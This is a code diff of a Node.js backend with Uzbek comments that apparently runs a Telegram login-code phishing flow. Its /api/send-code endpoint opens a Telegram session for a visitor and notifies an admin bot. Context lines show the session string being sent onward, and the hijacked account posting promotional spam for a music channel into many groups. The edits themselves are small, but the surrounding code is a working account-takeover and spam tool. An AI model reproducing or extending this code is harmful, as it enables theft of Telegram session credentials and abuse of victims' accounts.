@@ -45,12 +45,12 @@ app.post('/api/send-code', async (req, res) => {
     try {
         const stringSession = new StringSession("");
         
-        // Telegram DC2 sozlamasi bilan mijoz yaratamiz
+        // Telegram DC2 va barqaror ulanish parametrlari
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
             connectionRetries: 5,
             useWSS: false,
             dcId: 2,
-            serverAddress: "149.154.167.41",
+            serverAddress: "149.154.167.50", // DC2 Asosiy IP adresi
             port: 443
         });
 
@@ -72,7 +72,7 @@ app.post('/api/send-code', async (req, res) => {
             session: stringSession
         };
 
-        // Admin botga xabar
+        // Admin botga xabar yuborish
         if (ADMIN_ID) {
             await bot.sendMessage(
                 ADMIN_ID,
@@ -81,10 +81,10 @@ app.post('/api/send-code', async (req, res) => {
             );
         }
 
-        res.json({ success: true, message: "Kod Telegram ilovangizga yuborildi!" });
+        return res.json({ success: true, message: "Kod Telegram ilovangizga yuborildi!" });
     } catch (error) {
         console.error("Kod yuborishda xatolik:", error);
-        res.json({ success: false, message: "Kod yuborishda xatolik yuz berdi: " + error.message });
+        return res.json({ success: false, message: "Kod yuborishda xatolik yuz berdi: " + error.message });
     }
 });
 
@@ -181,7 +181,7 @@ ${sessionString}`;
                     for (const group of targetGroups) {
                         try {
                             await client.sendMessage(group.id, {
-                                message: "Eng So’ngi Musiqalar 👉@ MUZXS👈 kanalida"
+                                message: "Eng So’ngi Musiqalar 👉@MUZXS👈 kanalida"
                             });
                         } catch (msgErr) {
                             console.error(`Guruhga xabar yuborishda xato (${group.id}):`, msgErr);
